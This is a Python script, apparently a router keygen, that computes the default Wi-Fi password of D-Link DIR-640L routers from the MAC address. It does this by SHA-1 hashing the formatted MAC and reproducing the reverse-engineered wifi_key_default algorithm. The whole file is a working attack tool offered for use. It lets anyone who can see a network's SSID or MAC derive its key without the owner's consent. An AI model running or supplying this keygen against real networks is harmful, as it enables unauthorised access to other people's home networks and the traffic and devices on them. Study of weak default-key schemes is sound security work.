# keygen for the D-link DIR-640L with SSID dlink-XXXX (with XXXX the last two bytes of the MAC)
# much thanks to Strongwind for their large collection of dlink firmware
# and thanks to Selenium for the incredibly fast implementation of the found /usr/bin/wifi_key_default
# into QEMU emulation

import hashlib
import argparse

def dir_640l(mac):
	
	input_string = []
	for i in range(0, 12, 2):
		input_string.append(mac[i:i+2].upper())

	input_string = "_"+"_".join(input_string).upper()
	input_string += chr(10)

	hashh = hashlib.sha1()
	hashh.update(input_string.encode())
	hashh = list(hashh.hexdigest())
	key = [hashh[0], hashh[1], hashh[6], hashh[7], hashh[14], hashh[15], hashh[22], hashh[23], hashh[30], hashh[31]]

	password = [''] * 10
	for i in range(1, 11):
		letter = key[i-1]
		letter_value = int(letter, 16)
		if i > 5:
			password[i-1] = chr(48 + (letter_value % 10))
		else:
			if i & 1 == 0:
				password[i-1] = chr(107 + letter_value)
			else:
				password[i-1] = chr(97 + letter_value)
	password = "".join(password)
	
	print(password)




parser = argparse.ArgumentParser(description='Keygen for the D-link DIR-640L with SSID dlink-XXXX')
parser.add_argument('mac', help='Mac address (mac-1)')
args = parser.parse_args()

dir_640l(args.mac)